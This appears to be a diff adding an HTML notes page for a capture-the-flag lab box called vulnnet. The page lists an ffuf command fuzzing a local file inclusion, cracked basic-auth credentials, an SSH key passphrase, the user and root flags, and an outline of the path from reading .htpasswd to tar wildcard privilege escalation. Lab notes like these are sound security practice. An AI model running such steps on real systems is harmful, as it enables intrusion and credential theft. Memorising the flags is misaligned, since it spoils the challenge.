@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>vulnet</title>
+</head><body>admin : Password <br/>
+<br/>
+ffuf -c -u "http://vulnnet.thm/index.php?FUZZ=php://filter/convert.base64-encode/resource=index.php" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 5829 -t 300<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">referer &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Status: 200, Size: 13725, Words: 1689, Lines: 142]</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+http-basic-auth -&gt; developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0 (9972761drmfsls)<br/>
+<br/>
+Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==<br/>
+<br/>
+server-management : oneTWO3gOyac<br/>
+<br/>
+user : THM{907e420d979d8e2992f3d7e16bee1e8b}<br/>
+root : THM{220b671dd8adc301b34c2738ee8295ba}<br/>
+<br/>
+1 . add domain name<br/>
+2 . searched for diff files ( x )<br/>
+3 . subdomain enum (broadcast) ---------&gt; HTTP-Basic-Auth<br/>
+4 . we found that /index.php is vulnerable to LFI bypassing &nbsp;"../"<br/>
+5 . Read apache2 conf file got .htaccess<br/>
+6 . Read .htpasswd file -----&gt; HTTP-Basic Auth creds<br/>
+7 . clipbucket unauth file upload<br/>
+8 . /var/backups -&gt; id_rsa -&gt; oneTWO3gOyac<br/>
+9 . Tar wild Card Injection -&gt; root </body></html>
